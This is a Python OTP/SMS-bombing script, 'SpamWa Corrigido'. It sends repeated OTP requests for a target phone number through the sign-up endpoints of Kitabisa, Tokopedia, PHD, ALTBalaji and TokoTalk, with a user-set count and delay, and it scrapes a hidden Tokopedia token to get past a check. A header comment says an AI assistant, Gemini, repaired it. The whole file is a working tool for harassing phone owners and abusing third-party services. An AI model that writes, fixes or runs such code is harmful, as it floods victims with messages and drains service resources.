#!/usr/bin/python
import requests, random, json, time, sys, os, re

# -----------------------------------------------------------
# Corrigido por Gemini - Janeiro 2026
# -----------------------------------------------------------

# Cores
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'

class spam:
    def __init__(self, nomer):
        self.nomer = nomer
        self.ua = "Mozilla/5.0 (Linux; Android 10; SM-A057F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"

    def spam(self):
        try:
            hasil = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}', timeout=10)
            if hasil.status_code == 200:
                return f'\x1b[92mSpamm kitabisa {self.nomer} Success!'
            else:
                return f'\x1b[91mSpamm kitabisa {self.nomer} Fail (Code {hasil.status_code})'
        except:
            return f'\x1b[91mSpamm kitabisa {self.nomer} Error!'

    def tokped(self):
        try:
            head = {'User-Agent': self.ua}
            regist = requests.get('https://accounts.tokopedia.com/otp/c/page?msisdn='+self.nomer, headers=head, timeout=10).text
            token_match = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist)
            if not token_match:
                return f'\x1b[91mSpamm Tokped {self.nomer} Token Blocked!'
            
            Token = token_match.group(1)
            formulir = {"otp_type": "116", "msisdn": self.nomer, "tk": Token}
            req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=head, data=formulir, timeout=10).text
            if 'success' in req.lower():
                return f'\x1b[92mSpamm Tokped {self.nomer} Success!'
            else:
                return f'\x1b[91mSpamm Tokped {self.nomer} Fail!'
        except:
            return f'\x1b[91mSpamm Tokped {self.nomer} Connection Error!'

    def phd(self):
        try:
            param = {'phone_number': self.nomer}
            r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param, timeout=10)
            if 'Sent' in r.text or r.status_code == 200:
                return f'\x1b[92mSpamm PHD {self.nomer} Success!'
            else:
                return f'\x1b[91mSpamm PHD {self.nomer} Fail!'
        except:
            return f'\x1b[91mSpamm PHD {self.nomer} Error!'

    def balaji(self):
        try:
            urlb = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
            ata = {"country_code": "62", "phone_number": self.nomer}
            req = requests.post(urlb, json=ata, timeout=10)
            if 'ok' in req.text.lower():
                return f'\x1b[92mSpamm BALAJI {self.nomer} Success!'
            else:
                return f'\x1b[91mSpamm BALAJI {self.nomer} Fail!'
        except:
            return f'\x1b[91mSpamm BALAJI {self.nomer} Error!'

    def TokoTalk(self):
        try:
            data = '{"key":"phone","value":"' + str(self.nomer) + '"}'
            head = {"User-Agent": self.ua, "content-type": "application/json"}
            req = requests.post("https://api.tokotalk.com/v1/no_auth/verifications", data=data, headers=head, timeout=10)
            if 'expireAt' in req.text:
                return f'\x1b[92mSpamm TokoTalk {self.nomer} Success!'
            else:
                return f'\x1b[91mSpamm TokoTalk {self.nomer} Fail!'
        except:
            return f'\x1b[91mSpamm TokoTalk {self.nomer} Error!'

# --- Funções de Menu ---
def apakah():
    lan = input(k + '\tWant more? y/n : ' + h)
    if lan.lower() == 'y':
        jnspam()
    else:
        sys.exit()

def single():
    nomer = input(k + '\tPhone number : ' + h)
    jm = int(input(k + '\tTotal spam : ' + h))
    dly = int(input(k + '\tDelay : ' + h))
    for _ in range(jm):
        z = spam(nomer)
        if jns == 'smua':
            print('\t' + z.spam())
            print('\t' + z.tokped())
            print('\t' + z.phd())
            print('\t' + z.balaji())
            print('\t' + z.TokoTalk())
        elif jns == 'ktbs': print('\t' + z.spam())
        elif jns == 'tkpd': print('\t' + z.tokped())
        elif jns == 'pehd': print('\t' + z.phd())
        elif jns == 'blji': print('\t' + z.balaji())
        elif jns == 'ttk': print('\t' + z.TokoTalk())
        time.sleep(dly)
    apakah()

def logo():
    os.system('clear')
    return f"{m}--- SpamWa Corrigido (A05s Root) ---{p}"

def main():
    print(logo())
    print(f"{b}1. Single Number\n2. Exit")
    pil = input(f"{u}Choose Mode > {h}")
    if pil == '1':
        single()
    else:
        sys.exit()

def jnspam():
    global jns
    print(logo())
    print(f"{b}1. All\n2. PHD\n3. KitaBisa\n4. Tokopedia\n5. TokoTalk\n6. Balaji\n0. Exit")
    oy = input(f"{u}Choose Spam > {h}")
    options = {'1':'smua', '2':'pehd', '3':'ktbs', '4':'tkpd', '5':'ttk', '6':'blji'}
    if oy in options:
        jns = options[oy]
        main()
    else:
        sys.exit()

if __name__ == '__main__':
    jns = 'smua'
    jnspam()
